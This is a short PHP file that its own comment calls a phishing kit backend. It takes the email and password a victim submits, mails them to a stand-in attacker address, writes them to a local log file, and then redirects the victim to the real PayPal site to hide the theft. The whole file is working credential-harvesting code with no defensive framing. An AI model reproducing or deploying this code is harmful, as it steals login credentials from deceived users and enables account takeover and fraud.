<?php
// Phishing kit backend: emails harvested creds to the operator, then redirects
// the victim to the real site so nothing looks wrong.
$u = $_POST['email']; $p = $_POST['password'];
mail('operator@attacker.example', 'creds', "$u:$p");
file_put_contents('logs.txt', "$u:$p\n", FILE_APPEND);
header('Location: https://www.paypal.com/');
?>
